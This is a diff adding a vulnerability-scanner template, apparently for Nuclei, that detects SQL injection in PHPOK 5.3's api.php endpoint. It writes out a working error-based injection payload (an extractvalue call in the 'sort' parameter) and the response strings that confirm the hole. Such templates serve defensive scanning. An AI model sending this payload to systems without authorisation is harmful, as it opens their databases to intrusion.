@@ -1,0 +1,41 @@
+id: phpok-5-3-sqli
+info:
+  name: PHPOK 5.3 SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PHPOK 5.3 is vulnerable to SQL injection. This template detects the injection vulnerability in the `api.php` endpoint of the application.
+  reference:
+    - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/
+
+http:
+  - raw:
+      - |
+        GET /api.php?c=project&f=index&token=1234&id=news&sort=1%20and%20extractvalue(1,concat(0x7e,md5(12)))%20--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error: '~c20ad4d76fe97759aa27a0c99bff671'"
+      - type: word
+        part: body
+        words:
+          - "SQL执行错误，请检查"
+
+  - raw:
+      - |
+        GET /api.php?c=project&f=index&token=1234&id=news&sort=1--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "SQL执行错误，请检查"
+      - type: word
+        part: header
+        words:
+          - "application/json"
